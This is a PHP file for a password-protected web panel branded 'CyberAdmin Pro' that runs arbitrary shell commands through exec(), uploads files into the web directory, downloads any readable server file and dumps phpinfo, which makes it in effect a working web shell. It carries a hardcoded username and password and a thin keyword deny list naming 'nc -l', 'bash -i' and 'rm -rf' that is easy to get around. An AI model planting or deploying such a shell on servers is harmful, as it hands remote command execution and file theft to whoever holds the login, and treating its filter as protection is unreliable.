<?php
session_start();
ob_start();

// ================= CONFIGURATION =================
$CONFIG = [
    'password' => 'Shuju@123', // CHANGE THIS
    'username' => 'shuju',           // CHANGE THIS
    'session_timeout' => 3600,
    'base_directory' => '/var/www/html',
    'allowed_ips' => [],
    'log_actions' => true,
    'max_upload_size' => 100 * 1024 * 1024
];
// =================================================

// Security Functions
function checkAuth() {
    global $CONFIG;
    
    if (!empty($CONFIG['allowed_ips']) && !in_array($_SERVER['REMOTE_ADDR'], $CONFIG['allowed_ips'])) {
        logAction("BLOCKED_IP_ACCESS", $_SERVER['REMOTE_ADDR']);
        return false;
    }
    
    if (isset($_SESSION['authenticated']) && $_SESSION['authenticated'] === true) {
        if (time() - $_SESSION['login_time'] > $CONFIG['session_timeout']) {
            session_destroy();
            return false;
        }
        $_SESSION['last_activity'] = time();
        return true;
    }
    return false;
}

function logAction($action, $details = '') {
    global $CONFIG;
    if (!$CONFIG['log_actions']) return;
    
    $log = date('Y-m-d H:i:s') . " | " . $_SERVER['REMOTE_ADDR'] . " | $action | $details\n";
    file_put_contents('admin_actions.log', $log, FILE_APPEND | LOCK_EX);
}

function sanitizeInput($input) {
    return htmlspecialchars(strip_tags($input), ENT_QUOTES, 'UTF-8');
}

function isSafeCommand($command) {
    $dangerous = ['rm -rf', 'mkfs', 'dd', 'chmod 777', 'passwd', '> /dev', 'nc -l', 'bash -i'];
    foreach ($dangerous as $cmd) {
        if (stripos($command, $cmd) !== false) return false;
    }
    return true;
}

// Authentication
if (!checkAuth()) {
    if (isset($_POST['username']) && isset($_POST['password'])) {
        if ($_POST['username'] === $CONFIG['username'] && $_POST['password'] === $CONFIG['password']) {
            $_SESSION['authenticated'] = true;
            $_SESSION['login_time'] = time();
            $_SESSION['username'] = $_POST['username'];
            header('Location: ' . $_SERVER['PHP_SELF']);
            exit;
        } else {
            $error = "Invalid credentials!";
        }
    }
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <title>Secure Admin Login</title>
        <style>
            body { font-family: Arial; background: #1a1a1a; color: white; margin: 0; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
            .login-box { background: #2d2d2d; padding: 40px; border-radius: 10px; box-shadow: 0 0 20px rgba(0,0,0,0.5); width: 100%; max-width: 400px; }
            .logo { text-align: center; margin-bottom: 30px; }
            .logo h1 { color: #00ff88; margin: 10px 0; }
            .form-group { margin-bottom: 20px; }
            input[type="text"], input[type="password"] { width: 100%; padding: 12px; background: #1a1a1a; border: 1px solid #444; color: white; border-radius: 5px; }
            button { width: 100%; padding: 12px; background: #00ff88; color: black; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; }
            .error { background: #ff4444; color: white; padding: 10px; border-radius: 5px; margin-bottom: 20px; text-align: center; }
        </style>
    </head>
    <body>
        <div class="login-box">
            <div class="logo">
                <h1>🔐 ADMIN PORTAL</h1>
            </div>
            <?php if(isset($error)) echo "<div class='error'>$error</div>"; ?>
            <form method="post">
                <div class="form-group">
                    <input type="text" name="username" placeholder="Username" required>
                </div>
                <div class="form-group">
                    <input type="password" name="password" placeholder="Password" required>
                </div>
                <button type="submit">Login</button>
            </form>
        </div>
    </body>
    </html>
    <?php
    exit;
}

// Logout
if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

// Core Functions
function executeCommand($command) {
    if (!isSafeCommand($command)) {
        return "Error: Command blocked for security";
    }
    
    $output = [];
    $return_var = 0;
    exec($command . " 2>&1", $output, $return_var);
    return implode("\n", $output);
}

function getSystemInfo() {
    return [
        'os' => php_uname(),
        'server' => $_SERVER['SERVER_SOFTWARE'] ?? 'N/A',
        'php_version' => phpversion(),
        'memory_usage' => memory_get_usage(true),
        'memory_peak' => memory_get_peak_usage(true),
        'disk_free' => disk_free_space("/"),
        'disk_total' => disk_total_space("/")
    ];
}

// Process Actions
$output = '';
$current_dir = getcwd();

if ($_POST) {
    if (isset($_POST['command'])) {
        $command = sanitizeInput($_POST['command']);
        $output = executeCommand($command);
        logAction("COMMAND", $command);
    }
    elseif (isset($_POST['download'])) {
        $file = realpath($_POST['file_path']);
        if ($file && file_exists($file) && is_readable($file)) {
            header('Content-Description: File Transfer');
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename="'.basename($file).'"');
            header('Content-Length: ' . filesize($file));
            readfile($file);
            exit;
        } else {
            $output = "Error: File not accessible";
        }
    }
}

if (isset($_FILES['upload_file'])) {
    $upload = $_FILES['upload_file'];
    if ($upload['error'] === UPLOAD_ERR_OK) {
        $target = $current_dir . '/' . basename($upload['name']);
        if (move_uploaded_file($upload['tmp_name'], $target)) {
            $output = "File uploaded successfully";
        }
    }
}

$system_info = getSystemInfo();
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CyberAdmin Pro</title>
    <style>
        :root {
            --primary: #00ff88;
            --dark: #0a0a0a;
            --light: #1a1a1a;
            --text: #ffffff;
        }
        body { font-family: Arial; background: var(--dark); color: var(--text); margin: 0; padding: 0; }
        .header { background: #111; padding: 15px; border-bottom: 2px solid var(--primary); }
        .header-content { max-width: 1200px; margin: 0 auto; display: flex; justify-content: space-between; }
        .container { max-width: 1200px; margin: 20px auto; padding: 0 20px; }
        .tabs { display: flex; background: var(--light); border-radius: 5px 5px 0 0; }
        .tab { padding: 15px 20px; background: none; border: none; color: #ccc; cursor: pointer; }
        .tab.active { background: #333; color: var(--primary); }
        .tab-content { display: none; background: var(--light); padding: 20px; border-radius: 0 0 5px 5px; }
        .tab-content.active { display: block; }
        .command-form { display: flex; gap: 10px; margin-bottom: 20px; }
        .command-input { flex: 1; padding: 10px; background: #000; border: 1px solid #333; color: white; }
        .btn { background: var(--primary); color: black; border: none; padding: 10px 20px; cursor: pointer; font-weight: bold; }
        .output { background: #000; padding: 15px; border-radius: 5px; font-family: monospace; white-space: pre-wrap; }
        .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; margin-bottom: 20px; }
        .stat-card { background: var(--light); padding: 15px; border-radius: 5px; border-left: 4px solid var(--primary); }
    </style>
</head>
<body>
    <div class="header">
        <div class="header-content">
            <h1>🛡️ CyberAdmin Pro</h1>
            <div>
                Welcome, <?php echo $_SESSION['username']; ?> | 
                <a href="?logout=1" style="color: #ff4444;">Logout</a>
            </div>
        </div>
    </div>

    <div class="container">
        <div class="stats">
            <div class="stat-card">
                <h3>System</h3>
                <div><?php echo $system_info['os']; ?></div>
            </div>
            <div class="stat-card">
                <h3>PHP Version</h3>
                <div><?php echo $system_info['php_version']; ?></div>
            </div>
            <div class="stat-card">
                <h3>Memory</h3>
                <div><?php echo round($system_info['memory_usage'] / 1024 / 1024, 2); ?> MB</div>
            </div>
        </div>

        <div class="tabs">
            <button class="tab active" onclick="switchTab('terminal')">💻 Terminal</button>
            <button class="tab" onclick="switchTab('files')">📁 File Manager</button>
            <button class="tab" onclick="switchTab('phpinfo')">🐘 PHP Info</button>
        </div>

        <div id="terminal" class="tab-content active">
            <h2>Command Terminal</h2>
            <form method="post" class="command-form">
                <input type="text" name="command" class="command-input" placeholder="Enter command..." required>
                <button type="submit" class="btn">Execute</button>
            </form>
            <?php if (!empty($output)): ?>
                <div class="output"><?php echo sanitizeInput($output); ?></div>
            <?php endif; ?>
        </div>

        <div id="files" class="tab-content">
            <h2>File Manager</h2>
            <form method="post" enctype="multipart/form-data" style="margin-bottom: 20px;">
                <input type="file" name="upload_file" required>
                <button type="submit" class="btn">Upload File</button>
            </form>
            <div class="output">
                Current Directory: <?php echo $current_dir; ?>\n
                <?php
                $files = scandir($current_dir);
                foreach ($files as $file) {
                    if ($file != '.' && $file != '..') {
                        $type = is_dir($file) ? '📁' : '📄';
                        echo "$type $file\n";
                    }
                }
                ?>
            </div>
        </div>

        <div id="phpinfo" class="tab-content">
            <h2>PHP Information</h2>
            <div class="output">
                <?php
                ob_start();
                phpinfo();
                $phpinfo = ob_get_clean();
                echo $phpinfo;
                ?>
            </div>
        </div>
    </div>

    <script>
        function switchTab(tabName) {
            document.querySelectorAll('.tab-content').forEach(tab => tab.classList.remove('active'));
            document.querySelectorAll('.tab').forEach(tab => tab.classList.remove('active'));
            document.getElementById(tabName).classList.add('active');
            event.target.classList.add('active');
        }
    </script>
</body>
</html>
<?php
ob_end_flush();
?>
